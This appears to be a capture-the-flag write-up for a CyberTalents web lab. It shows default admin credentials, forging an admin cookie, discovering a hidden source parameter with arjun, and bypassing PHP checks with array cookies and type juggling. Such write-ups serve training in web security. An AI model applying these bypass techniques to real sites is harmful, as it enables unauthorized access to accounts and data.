- there is a hint admin:admin in source code
- when you intercept requests you will notice the response :
````
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Fri, 11 Aug 2023 06:02:06 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 678
Connection: close
X-Powered-By: PHP/7.2.34
Set-Cookie: admin=False
Vary: Accept-Encoding
````
- try get request with Cookie: admin=True
````
POST /index.php HTTP/1.1
Host: wcamxwl32pue3e6mrndvjlluezy41y3eq9ypfx3m-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: admin=True
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://wcamxwl32pue3e6mrndvjlluezy41y3eq9ypfx3m-web.cybertalentslabs.com
Connection: close
Referer: http://wcamxwl32pue3e6mrndvjlluezy41y3eq9ypfx3m-web.cybertalentslabs.com/index.php
Upgrade-Insecure-Requests: 1

user_name=admin&user_pass=admin&submit=Login
````
- you will redirect to page you can access it directly or find it by fuzzing  XD
- hint: May Be Guessing Is Helpful ;)
- use arjun will find parameter src 
````
arjun -u http://wcamxwl32pue3e6mrndvjlluezy41y3eq9ypfx3m-web.cybertalentslabs.com/InSiDe.php
````
- you can see the source now by http://wcamxwl32pue3e6mrndvjlluezy41y3eq9ypfx3m-web.cybertalentslabs.com/InSiDe.php?src=
- first part
  
````
if(strcmp($_GET['flag'],"View")==0)
// http://wcamxwl32pue3e6mrndvjlluezy41y3eq9ypfx3m-web.cybertalentslabs.com/InSiDe.php?flag=View
````
- second part

````
Cookie: cc[0]=0; kk[1]=0
````
- third part

````
User-Agent: 1e9
````
